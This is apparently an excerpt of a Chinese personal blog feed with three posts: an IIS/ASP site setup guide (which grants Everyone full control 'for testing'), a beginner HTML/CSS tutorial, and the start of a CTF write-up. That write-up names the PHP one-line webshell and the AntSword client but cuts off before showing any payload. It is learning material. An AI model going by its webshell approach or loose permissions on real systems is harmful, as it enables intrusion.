src="https://img-blog.csdnimg.cn/20200428134441898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>10.配置成功。出现下图页面，点击完成。<br><img src="https://img-blog.csdnimg.cn/20200428135115412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>11.点关闭页面，点击“开始菜单”——点击“管理工具”——点击第一项“Internet”。<br><img src="https://img-blog.csdnimg.cn/20200428135238462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>12.打开后出现<br><img src="https://img-blog.csdnimg.cn/20200428135710359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>13.右键单击“默认网站”——点击“打开”<br><img src="https://img-blog.csdnimg.cn/20200428135843343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>14.选择全部文件，删除<br><img src="https://img-blog.csdnimg.cn/20200428135938220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>15.右键单击——新建——文本文件，文件名为<code>index.html</code><br><img src="https://img-blog.csdnimg.cn/20200428140131739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>16.右键单击这个文件，选择编辑<br>编辑一段文字即可(内容随意)。</p><p>17.右键单击默认网站——选择权限</p><p>18.点击添加</p><p><img src="https://img-blog.csdnimg.cn/20200428140809433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>19.选择高级<br><img src="https://img-blog.csdnimg.cn/20200428140944173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>20.点击 “立即查找”——在下面找到“Everyone”<br><img src="https://img-blog.csdnimg.cn/20200428141053516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>21.选好之后点击确定，再点击确定。(点两次)<br>选择完全控制，点击允许(因为是测试，所以可以设置成这样)，点击确定<br><img src="https://img-blog.csdnimg.cn/20200428141457929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>22.右键单击默认网站，选择“属性”，点开后，找到“文档”打开，按照下图一步一步做，(默认内容文档全部删除)<br><img src="https://img-blog.csdnimg.cn/20200428142138492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><p>23.点击添加，将自己编写的<code>index.html</code>写上，点击确定，再次确定。<br><img src="https://img-blog.csdnimg.cn/20200428142037205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>24.回到桌面，点击打开浏览器，<br><img src="https://img-blog.csdnimg.cn/2020042814264447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>25.输入<code>127.0.0.1</code>或者加上http(无所谓的)，就可以看到在<code>index.html</code>里写的内容了。<br><img src="https://img-blog.csdnimg.cn/20200428142827851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>测试成功，下面开始搭建网站。<br>1.网站——新建——网站</p><p><img src="https://img-blog.csdnimg.cn/20200428143929671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>2.点击下一步</p><p><img src="https://img-blog.csdnimg.cn/20200428144009668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>3.描述可随意，点击下一步<br><img src="https://img-blog.csdnimg.cn/20200428144058511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>4.直接点击下一步<br><img src="https://img-blog.csdnimg.cn/20200428144149205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>补充知识：IP分配就是配置服务器的IP，别人可以通过本机(服务器)的IP地址，可以访问我们的网站。端口分配的话， 我在啃书的栏目中第一口。有对端口的理解，这里不再重复。这里不需要修改，想改动，后面也可以更改。<br>5.路径选择，浏览，选择C盘下的，<code>Inetput</code>文件夹下的<code>wwwroot</code>文件夹，点击确定。点击下一步<br><img src="https://img-blog.csdnimg.cn/20200428144752168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>6.点击下一步，因为访问网站的用户，我们就让他可读就行。<br><img src="https://img-blog.csdnimg.cn/20200428144947130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>7.点击完成<br><img src="https://img-blog.csdnimg.cn/2020042814511041.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>8.选择默认网站，点击停止，因为不能同时开两个网站。<br><img src="https://img-blog.csdnimg.cn/2020042814514951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>9.右键点击自己创建的网站，点击启动。</p><p>10.自己在百度找一个asp源码，我选择这个。<br><img src="https://img-blog.csdnimg.cn/2020042814575890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>我选择了第一个。<br><img src="https://img-blog.csdnimg.cn/20200428145836339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>找到下载地址，随便挑个<br><img src="https://img-blog.csdnimg.cn/20200428145925479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>11.将下载好的压缩包，拖进虚拟机中，<br><img src="https://img-blog.csdnimg.cn/20200428150112754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>12.打开创建的网站<br><img src="https://img-blog.csdnimg.cn/20200428150234365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>13.双击打开压缩包。打开文件，<br>全部选中文件剪切(或复制)到网站的源码文件夹<br><img src="https://img-blog.csdnimg.cn/20200428150631894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>14.找找里面的<code>index.asp</code>,然后先关闭了这个文件夹<br>点击网站j4y，右键点击，选择属性，点击文档，全部删除内容文档。<br><img src="https://img-blog.csdnimg.cn/20200428150936427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>15..添加<code>index.asp</code>点击确定就行了。<br>16.点击“主目录”，选择“执行权限”，选择纯脚本。<br><img src="https://img-blog.csdnimg.cn/20200428151205199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>17.点击配置，<br><img src="https://img-blog.csdnimg.cn/2020042815132444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>18.点击“选择”——启用父路径<img src="https://img-blog.csdnimg.cn/20200428151408465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>19.选择“调试”——调试标志，两个全部勾选，点击确定。再次确定<br><img src="https://img-blog.csdnimg.cn/20200428151550181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>20.点击Web服务扩展，点击<code>Active Server Pages</code>，点击允许。<br><img src="https://img-blog.csdnimg.cn/20200428151649626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>21.点击j4y网站，右键点击，进行关闭和启动操作来达到重启的目的。<br>22.可以在浏览器中打开<code>127.0.0.1</code>打开网站。<br><img src="https://img-blog.csdnimg.cn/20200428152027653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>点击添加就行了。<br>然后会进入了你的网站<br><img src="https://img-blog.csdnimg.cn/202004281522402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>23.那么这个时候如何让别人也能访问这个网站呢？？<br>这个时候就需要别人访问虚拟机的IP地址来访问网站了。<br>获取IP地址就行了。<br>打开cmd，输入命令<code>ipconfig</code>就能获取到IP地址了。<br><img src="https://img-blog.csdnimg.cn/20200428153456200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><p>实验，我在主机上访问这个网站<br><img src="https://img-blog.csdnimg.cn/20200428153532151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><p>到这里，一个简单的网站就搭建成功了。</p><p>总结：第二次搭建，速度快了很多。学到很多，自己搭建成功后很开心，有收获就开心。加油，继续努力。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小白初学HTML</title>
      <link href="/posts/ae0c60ef/"/>
      <url>/posts/ae0c60ef/</url>
      
        <content type="html"><![CDATA[<p>本周学习HTML，我自己通过学习，可以自己制作一些简单的网页了，此期间我只学到表单提交这一块内容，以及几个简单的CSS语句。</p><h1 id="HTML简介"><a href="#HTML简介" class="headerlink" title="HTML简介"></a>HTML简介</h1><p><strong>HTML是互联网上应用最广泛的标记语言。HTML文件就是普通文本+HTML标记，而不同的HTML标记能表示不同的效果。现在学习的网页制作就是通过学习HTML来实现的。</strong></p><h1 id="HTML标签"><a href="#HTML标签" class="headerlink" title="HTML标签"></a>HTML标签</h1><p>HTML标签是由尖括号包围的关键词，并且标签都是成对出现的，标签对中的第一个标签是开始标签，第二个标签是结束标签，如<code>&lt;html&gt;...&lt;/html&gt;</code>开始和结束标签也可以叫做开放标签和闭合标签。<br>HTML标签有文本标签、图片标签、表格标签，地区标签……</p><h5 id="文本标签"><a href="#文本标签" class="headerlink" title="文本标签"></a>文本标签</h5><p>这里我举出几个常用的文本标签如下：换行标签<code>&lt;br&gt;</code>、空格标签<code>&amp;nbsp;、</code>将标签里的内容加粗<code>&lt;strong&gt;...&lt;/strong&gt;</code>、将内容变成斜体<code>&lt;em&gt;...&lt;/em&gt;</code>、在标签的文字上加一条横线<code>&lt;del&gt;...&lt;/del&gt;</code>如“<del>删除此条内容</del>”……</p><h5 id="2-图片标签："><a href="#2-图片标签：" class="headerlink" title="2.图片标签："></a>2.图片标签：</h5><p>图片类型：<br>jpg：有损压缩，且影响画质，图片较小。<br>png：无损压缩，不影响画质，但图片较大。<br>gif：动图。<br>**<em>下面，我举一个实例：**</em></p><pre class="language-css" data-language="css"><code class="language-css">   &lt;img src=<span class="token string">"xiaohuangren.jpg"</span> alt=<span class="token string">"小黄人"</span>>&lt;img src=<span class="token string">"nezha.png"</span> alt=<span class="token string">"哪吒"</span>>&lt;img src=<span class="token string">"dongtu.gif"</span> alt=<span class="token string">"动图"</span>></code></pre><p><strong><em>显示结果如下：</em></strong><br><img src="https://img-blog.csdnimg.cn/20200115010433728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>图片方式：<br>1.网络图片：将图片链接直接放进去，如：</p><pre class="language-css" data-language="css"><code class="language-css">&lt;img src=<span class="token string">"图片网址"</span> alt=<span class="token string">"描述"</span>></code></pre><p>2.本地图片：<br>*绝对路径：从盘符算起的路径。<br>*相对路径：从当前路径算起的路径。<br>简单的办法就是将图片跟HTML网页放在同一个文件夹里。</p><h5 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h5><p>如下：</p><pre class="language-css" data-language="css"><code class="language-css">&lt;a href=<span class="token string">"http://www.mi.com"</span>>超链接&lt;/a></code></pre><p><strong>herf</strong> 是HTML一种属性。下面会说到。<br>按照这个例子，在网页中通过鼠标点击 <strong>“超链接”</strong>就会跳转到小米的官网。</p><h1 id="HTML属性"><a href="#HTML属性" class="headerlink" title="HTML属性"></a>HTML属性</h1><p>属性为HTML元素提供附加信息。<br>HTML标签可以拥有属性，且属性总是以名称/值对的形式出现，比如：<code>name=&quot;value&quot;</code>。<br>属性总是在HTML元素的开始标签中规定。<br>属性实例：</p><pre class="language-css" data-language="css"><code class="language-css">属性例子1&lt;h1 align=<span class="token string">"center"</span>>...&lt;/h1>      拥有关于对齐方式的附加信息属性例子2&lt;body bgcolor=<span class="token string">"red"</span>>...&lt;/body>   拥有关于背景颜色的附加信息</code></pre><h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>1.无序列表  <code>&lt;ul&gt;</code><br>2.有序列表  <code>&lt;ol&gt;</code><br>3.自定义列表  <code>&lt;dl&gt;</code></p><h1 id="HTML表格"><a href="#HTML表格" class="headerlink" title="HTML表格"></a>HTML表格</h1><p>表格形式：</p><pre class="language-css" data-language="css"><code class="language-css">&lt;table>&lt;!--若干   行-->&lt;tr>&lt;!--若干个   单元格-->&lt;th>...&lt;/th>   &lt;!--标题-->&lt;/tr>                      &lt;!--注意：表格是一行一行来完成的。-->  &lt;/table></code></pre><p>这里还是举个实例：</p><pre class="language-css" data-language="css"><code class="language-css">&lt;table border=<span class="token string">"2"</span>>&lt;tr>   &lt;th style=<span class="token string">"color: red"</span>>小组名&lt;/th>   &lt;th style=<span class="token string">"color: red"</span>>成员&lt;/th>   &lt;th style=<span class="token string">"color: red"</span>>段位&lt;/th>&lt;/tr>&lt;tr>   &lt;th rowspan=<span class="token string">"4"</span> style=<span class="token string">"color: red"</span>>XXXXXXXXX&lt;/th>   &lt;th style=<span class="token string">"color: red"</span>>小明&lt;/th>   &lt;th style=<span class="token string">"color: red"</span>>最强王者&lt;/th>&lt;/tr>&lt;tr>   &lt;th style=<span class="token string">"color: red"</span>>小小明&lt;/th>   &lt;th style=<span class="token string">"color: red"</span>>最强王者&lt;/th>&lt;/tr>&lt;tr>   &lt;th style=<span class="token string">"color: red"</span>>大明&lt;/th>   &lt;th style=<span class="token string">"color: red"</span>>至尊星耀&lt;/th>&lt;/tr>&lt;tr>   &lt;th style=<span class="token string">"color: red"</span>>XXX&lt;/th>   &lt;th style=<span class="token string">"color: red"</span>>永恒钻石&lt;/th>&lt;/tr>&lt;/table></code></pre><p>border是表格的一种属性。<br>页面显示为：<br><img src="https://img-blog.csdnimg.cn/20200115015129108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h1 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h1><p><code>&lt;form&gt;...&lt;/form&gt;</code><br>收集用户输入，发送或提交给服务器<br>·输入：内容<br>文本：1.普通文本，   2.密码文本（输入后看不到数字，只能看见星号。）<br>单选框 :       input标签 radio属性<br>多选框    :     input标签   checkbox属性<br>下拉框  :      select标签<br>地区标签:  <code>&lt;option&gt;...&lt;/option&gt;</code><br>提交：  提交按钮，说到提交按钮，就提一下http吧<br>http: 叫做超文本传输协议，浏览器和服务器的通讯协议。<br>http的一种模式：请求—应答<br>两种请求   GET      POST  常见的；<br>我也做了一个简单的表单：</p><pre class="language-css" data-language="css"><code class="language-css">&lt;!DOCTYPE html>&lt;html lang=<span class="token string">"en"</span>>&lt;head>&lt;meta charset=<span class="token string">"UTF-8"</span>>&lt;title>我的第一个网页&lt;/title>&lt;/head>&lt;body style=<span class="token string">"background: red"</span>>&lt;form action=<span class="token string">""</span>>&lt;h1 style=<span class="token string">"color: blue"</span>>账户登录&lt;/h1>&lt;br>    账号：&lt;input type=<span class="token string">"text"</span> name=<span class="token string">"user"</span>>&lt;br>    密码：&lt;input type=<span class="token string">"password"</span> name=<span class="token string">"password"</span>>&lt;br>    性别：&lt;input type=<span class="token string">"radio"</span> name=<span class="token string">"sex"</span>> 男         &lt;input type=<span class="token string">"radio"</span> name=<span class="token string">"sex"</span>>  女         &lt;input type=<span class="token string">"radio"</span> name=<span class="token string">"sex"</span>>  不详    &lt;br>    &lt;p style=<span class="token string">"color: gold"</span>>所在地：&lt;/p>    &lt;select name=<span class="token string">"city"</span>>         &lt;option value=<span class="token string">""</span>>北京&lt;/option>         &lt;option value=<span class="token string">""</span>>上海&lt;/option>         &lt;option value=<span class="token string">""</span>>广州&lt;/option>         &lt;option value=<span class="token string">""</span>>深圳&lt;/option>    &lt;/select>&lt;br>&lt;input type=<span class="token string">"submit"</span>>&lt;/form>&lt;/body>&lt;/html></code></pre><p>网页是这样的<br><img src="https://img-blog.csdnimg.cn/2020011502011820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h1 id="css"><a href="#css" class="headerlink" title="css"></a>css</h1><p><strong>CSS</strong>层叠样式表(Cascading Style Sheets)，是一种样式表语言，用来描述HTML。CSS描述了在屏幕、纸质、音频等其他媒体上的元素应该如何被渲染放置的问题。<br>CSS同意通过下面几种方式添加到HTML中：<br>1.内联样式：在HTML元素中使用“style”属性。是在开始标签中添加“style”属性。可以添加多种属性。这种样式比较常见。<br>2.内部样式表：在HTML文档头部<code>&lt;head&gt;</code>区域使用style元素，来包含CSS。<br><strong>样式1：</strong></p><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">&lt;!DOCTYPE html>&lt;html lang="en">&lt;head>&lt;meta charset="UTF-8">&lt;title>样式1&lt;/title>    &lt;style>     div</span> <span class="token punctuation">&#123;</span>     <span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span> <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span> <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    &lt;/style>&lt;/head>&lt;body>&lt;div>大西瓜1&lt;/div>&lt;div style=<span class="token string">"color: red; width: 100px;height: 100px;"</span>>大西瓜2&lt;/div>&lt;/body>&lt;/html></code></pre><p>再看页面：<br><img src="https://img-blog.csdnimg.cn/20200116160323929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" loading="lazy"><br>这就是两种不同的插入方法，结果是一样的。<br><strong>对单个使用，推荐使用第一类方法，而对多个使用推荐第二类，比较省时省力。</strong><br>3.外部引用：在外部再创建一个CSS文件，插入HTML中。<br>话不多说，看样例。<br><strong>样例2：</strong><br><img src="https://img-blog.csdnimg.cn/20200116161811133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这里为了看的方便，分屏打开两个文件。<br><img src="https://img-blog.csdnimg.cn/20200116162215893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>注意：两个文件都必须先保存下来再打开才会成功看到想要的效果。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF题记————无事小记</title>
      <link href="/posts/4ea7e983/"/>
      <url>/posts/4ea7e983/</url>
      
        <content type="html"><![CDATA[<p>前言：<br>不断学习，不断进步，加油。<br>本文目录</p><ul><li><a href="Augenstern"><a href="#1" target="_self">Web</a></a><br><a href="Augenstern"><a href="#2" target="_self">webshell</a></a><br><a href="Augenstern"><a href="#3" target="_self">command_execution</a></a><br><a href="Augenstern"><a href="#4" target="_self">xff_referer</a></a></li><li><a href="Augenstern"><a href="#5" target="_self">Misc</a></a><br><a href="Augenstern"><a href="#6" target="_self">基础破解</a></a><br><a href="Augenstern"><a href="#7" target="_self">镜子里面的世界</a></a><br><a href="Augenstern"><a href="#8" target="_self">教练，我..我想打CTF</a></a><ul><li><a href="Augenstern"><a href="#9" target="_self">Crypto</a></a><br><a href="Augenstern"><a href="#10" target="_self">凯撒？替换？呵呵!</a></a><br><a href="Augenstern"><a href="#11" target="_self">告诉你个秘密</a></a><br><a href="Augenstern"><a href="#12" target="_self">Crack it</a></a><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a><h3 id="1">Web</h3></h3><h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a><h5 id="2">webshell</h5></h1><img src="https://img-blog.csdnimg.cn/20200324103131740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我也去百度，php一句话。听说是一句话木马。听说过，没玩过，学一下。<a href="https://baike.baidu.com/item/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/1845646?fr=aladdin">一句话木马百度百科</a>然后打开环境看看，发现一个比较干净的页面，就f12看看呗<br><img src="https://img-blog.csdnimg.cn/20200324104118560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然而什么也看不出来，只能看懂那个php代码的主要部分是<code>shell</code>其他的找了好久也没找出来，御剑扫描也扫了，都找不出来。没办法了，找大佬写的wp吧，看了后发现是要用到工具的，中国蚁剑。这个我没有，装一个，早就想装了。百度很好找的，下载地址在GitHub上，<a href="https://github.com/AntSwordProject/">中国蚁剑github地址</a>，自行下载。怎么可能没有坑？不可能，看一下教程，奥，真简单。到自己了，去tm的坑。<br><img src="https://img-blog.csdnimg.cn/20200324104935279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这是我在解压那个加速器时出现的错误。当然可能是我脸黑，重新下载了好几遍都是这样，最后终于找到不对的地方了<br><img src="https://img-blog.csdnimg.cn/20200324105237195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个不要下载，往下翻。找到加速器<br><img src="https://img-blog.csdnimg.cn/20200324105350592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>点进去，不要急着download  zip，往下翻<br><img src="https://img-blog.csdnimg.cn/20200324105452395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个才是正确的，（选择与自己操作系统匹配的）下载就行了。安装的话就没啥错了。<br>开始解题<br><img 